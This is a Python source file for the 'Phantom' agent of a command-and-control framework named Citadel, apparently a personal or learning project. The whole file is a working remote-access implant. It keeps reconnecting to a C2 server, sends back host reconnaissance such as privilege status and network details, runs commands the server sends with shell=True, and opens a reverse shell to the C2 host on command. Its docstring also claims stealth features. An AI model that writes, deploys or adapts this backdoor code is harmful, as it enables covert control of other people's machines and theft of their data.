"""
Phantom C2 Agent

Features:
- Persistent connection with C2
- Command execution
- Reverse shell capability
- System reconnaissance
- Stealth mechanisms

Author: johntad
Version: 0.0.0
"""

import socket
import subprocess
import platform
import logging
import time
import os
import argparse
import sys

from citadel import C2Protocol


class PhantomAgent:
    """
    A remote agent designed to connect back to a Citadel C2 server and execute commands.
    """

    def __init__(self, c2_host: str = None, c2_port: int = 8886):
        """
        Initialized the Phantom agent.

        Args:
            c2_host (str): The IP address or hostname of the Citadel C2 server.
            c2_port (int): The port unmber of the Citadel C2 server. Defaults to 8886.
        """
        if not c2_host:
            self._parse_args()
        else:
            self.c2_host = c2_host
            self.c2_port = c2_port
        self.connection: socket.socket | None = None
        self.running = False
        self._init_agent()

    def _parse_args(self):
        parser = argparse.ArgumentParser(description='Phantom C2 Agent')
        parser.add_argument('--c2-host', required=True,
                            help='C2 server IP/hostname')
        parser.add_argument('--c2-port', type=int,
                            default=8886, help='C2 server port')
        args = parser.parse_args()

        self.c2_host = args.c2_host
        self.c2_port = args.c2_port

    def _init_agent(self):
        """
        Agent initialization routine

        Includes gathething system information and setting up logging.
        """
        self.system_info = self._gather_intel()
        self._setup_logging()

    def _setup_logging(self):
        """
        Configure agent logging

        Sset up basic configuration with a format including timestamps, log levels,
        and a specific date format.
        """
        logging.basicConfig(
            format="[%(asctime)s] %(levelname)s %(message)s",
            level=logging.DEBUG,
            datefmt="%H:%M:%S"
        )

    def connect(self):
        """
        Estalish connection with C2 server

        This method runs in a loop, attempting to connect to the server. If the connection
        fails, it waits for a specified time before retrying. Once connected, it registers
        with the server and enters the command processign loup.
        """
        self.running = True
        while self.running:
            try:
                self.connection = socket.create_connection(
                    (self.c2_host, self.c2_port))
                self._register()
                self._command_loop()
            except Exception as e:
                logging.error(f"Connection failed: {str(e)}")
                time.sleep(30)

    def _register(self):
        """
        Initial check-in with C2

        Uses the C2Protocol to build a SYSTEM_INFO message containing the gathered
        system details and sends it over the extablished connection.
        """
        self.connection.send(
            C2Protocol.build_message("SYSTEM_INFO", self.system_info)
        )

    def _gather_intel(self) -> dict:
        """
        Collect system reconnaissance data

        Gathers details such as hostnaem, operating system, release version, username,
        privilege status, and network configuration.

        Returns:
            dict: A dictionart containing the collected system info.
        """
        return {
            "hostname": platform.node(),
            "os": platform.system(),
            "release": platform.release(),
            "user": platform.uname().node,
            "privileged": self._check_privileges(),
            "network": self._network_info()
        }

    def _command_loop(self):
        """
        Main command processing loop

        Continously listens for incoming messages from the server, parses them using
        the C2Protocol, and dispatches actions based on the message header. Handles
        COMMAND, SHELL, SELF_DESTRUCT, and KEEPALIVE messages.
        """
        while self.running:
            try:
                message = self.connection.recv(4096)
                if not message:
                    raise ConnectionError("Connection closed by server")

                header, payload = C2Protocol.parse_message(message)

                if not header:
                    logging.error("Invalid message format")
                    continue

                if header == "COMMAND":
                    self._execute_command(payload['data'])
                elif header == "SHELL":
                    self._reverse_shell(payload['data'])
                elif header == "SELF_DESTRUCT":
                    self.terminate()
                elif header == "KEEPALIVE":
                    self.connection.send(C2Protocol.build_message("ACK"))
                else:
                    logging.warning(f"Unknown command: {header}")

            except ConnectionError as e:
                logging.error(f"Connection error: {str(e)}")
                self._reconnect()
            except Exception as e:
                logging.error(f"Command processing error: {str(e)}")
                time.sleep(5)  # Prevent tight loop on errors

    def _execute_command(self, command: str):
        """
        Execute system command and return results

        Uses the subprocess module to run the command, captures its output (both stdout and stderr),
        and sends the result back to the Citadel within a COMMAND_RESPONSE message.

        Args:
            command (str): The command to be executed.
        """
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            output = result.stdout if result.stdout else result.stderr
            self.connection.send(
                C2Protocol.build_message("RESPONCE", {"output": output})
            )
        except Exception as e:
            self.connection.send(
                C2Protocol.build_message("ERROR", {"message": str(e)})
            )

    def _reverse_shell(self, config: dict):
        """
        Establish reverse shell connection

        Connect to the port specified in the configuration received from the server
        and then enters a loop to receive commands from the server and executes them
        using the system's shell, sending the output back over the same connection.

        Args: 
            config (dict): A dictionary containing configuration parametrs, 
            including the port for the reverse shell.
        """
        target_port = config.get('port', 8887)
        try:
            shell_socket = socket.create_connection(
                (self.c2_host, target_port)
            )

            while True:
                cmd = shell_socket.recv(1024).decode()
                if not cmd:
                    break

                output = subprocess.getoutput(cmd)
                shell_socket.send(output.encode())
        except Exception as e:
            logging.error(f"Shell error: {str(e)}")
        finally:
            shell_socket.close()

    def terminate(self):
        """
        Clean up and exit

        Sets the running flag to False, closes the connection to C2 server if it exists,
        logs the termination event, and exits the agent process.  
        """
        self.running = False
        if self.connection:
            self.connection.close()
        logging.info("Agent terminating")
        sys.exit(0)

    def _check_privileges(self) -> bool:
        """
        Check if running with elevated privileges (root on Unix, Administrator on Windows)

        Returns:
            bool: True if running with elevated privileges, False otherwise.
        """
        try:
            return os.getuid() == 0  # Unix
        except AttributeError:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0  # Windows

    def _network_info(self) -> dict:
        """
        Collect network configuration

        Retruves the system's IP addersses and defaults gate way information using system commands.

        Returns: 
            dict: A dictionary containing network information.
        """
        return {
            "ips": subprocess.getoutput("hostname -I"),
            "gateway": subprocess.getoutput("ip route | grep default")
        }

    def _reconnect(self):
        """
        Handles reconnection attempts to the C2 server after a disconnection.

        Logs the disconnection and waits for a specified time before attempting to
        re-establish the connection.
        """
        logging.info("Attempting to reconnect in 30 seconds...")
        time.sleep(30)


# do this: `python -m citadel.agent.phantom` to run just this phantom
if __name__ == "__main__":
    agent = PhantomAgent()
    agent.connect()
